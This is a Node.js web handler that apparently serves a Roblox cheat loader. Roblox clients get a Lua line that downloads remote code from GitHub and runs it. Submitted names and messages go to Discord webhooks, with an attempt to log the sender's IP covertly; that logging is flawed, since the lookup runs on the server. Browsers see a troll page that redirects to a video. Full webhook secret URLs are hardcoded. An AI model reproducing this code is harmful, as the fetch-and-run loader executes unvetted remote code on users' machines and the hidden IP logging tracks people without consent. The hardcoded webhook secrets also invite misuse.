import fetch from 'node-fetch';

const ipifyUrl = 'https://api.ipify.org?format=json'; // API to get the user's IP address

export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';

  // Roblox client loading
  if (userAgent.includes('Roblox') || userAgent === '') {
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`
      print("Script loaded!")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
    `);
  } else if (req.method === 'POST') {
    // Handle submitted messages (skid or regular)
    let body = '';
    req.on('data', (chunk) => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      const data = JSON.parse(body);
      let name = data.name || 'Unknown';
      let message = data.message || 'No message';

      // Prevent @everyone and @here pings
      name = name.replace(/@/g, '@\u200b');
      message = message.replace(/@/g, '@\u200b');

      // Get IP address using ipify API
      let ipAddress = 'Unknown IP';
      try {
        const ipResponse = await fetch(ipifyUrl);
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || 'Unknown IP';
      } catch (error) {
        console.error('Error fetching IP:', error);
      }

      // Send name and message to the first webhook (skid info)
      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
      try {
        await fetch(skidWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`,
          }),
        });
      } catch (error) {
        console.error('Error sending skid message:', error);
      }

      // Send IP address and name to the second webhook (IP info)
      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
      try {
        await fetch(ipWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**IP Address Detected**\n**IP Address:** ${ipAddress}\n**Real Name:** ${name}`,
          }),
        });
      } catch (error) {
        console.error('Error sending IP data:', error);
      }

      res.status(200).json({ success: true });
    });
  } else {
    // If GET request or other type, serve HTML page with loading and song
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>What Are You Doing</title>
        <style>
          body {
            background-color: black;
            color: white;
            font-family: monospace;
            text-align: center;
            margin-top: 100px;
          }
          #loading-bar {
            width: 0;
            height: 30px;
            background-color: red;
            margin-top: 20px;
            transition: width 3s ease-in-out;
          }
          #loading-text {
            font-size: 24px;
            margin-top: 20px;
          }
          audio {
            display: none;
          }
          h1 {
            font-size: 50px;
            color: yellow;
          }
          .troll-text {
            font-size: 20px;
            color: green;
            margin-top: 30px;
            text-shadow: 2px 2px 5px red;
          }
        </style>
      </head>
      <body>
        <h1>What Are You Doing</h1>
        <div id="loading-bar"></div>
        <div id="loading-text">Loading... Please wait!</div>
        <div class="troll-text" id="troll-text">You thought you were going to get something cool...</div>

        <audio id="song" autoplay loop>
          <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3">
        </audio>

        <script>
          // Simulate a crazy loading bar with random breaks
          function fakeLoadingBar() {
            const loadingBar = document.getElementById('loading-bar');
            const loadingText = document.getElementById('loading-text');
            const trollText = document.getElementById('troll-text');
            let fakeProgress = 0;
            let randomDelay = 1000;

            function randomizeProgress() {
              const randomTime = Math.random() * 2000 + 1000; // Randomized loading time
              fakeProgress = Math.min(fakeProgress + Math.random() * 20, 100); // Increase progress
              loadingBar.style.width = fakeProgress + '%';
              if (fakeProgress >= 50 && fakeProgress < 100) {
                loadingText.innerText = 'Loading... Almost there!';
              }

              if (fakeProgress < 100) {
                setTimeout(randomizeProgress, randomTime); // Continue loading
              } else {
                loadingText.innerText = 'Done loading! Redirecting you...';
                setTimeout(() => {
                  window.location.href = "https://m.youtube.com/watch?v=NjD0H4eBfng&pp=ygUObmFlIG5pKiphIHNvbmc%3D"; // Rickroll URL
                }, 1000); // Redirect after 1 second
              }
            }

            randomizeProgress();

            // Update troll text every 3 seconds
            setInterval(() => {
              const trollMessages = [
                "You can't escape!",
                "This is where the fun begins...",
                "I'm watching you!",
                "This isn't over!",
                "Get ready for the surprise!"
              ];
              trollText.innerText = trollMessages[Math.floor(Math.random() * trollMessages.length)];
            }, 3000);
          }

          // Call fake loading bar function
          fakeLoadingBar();
        </script>
      </body>
      </html>
    `);
  }
}
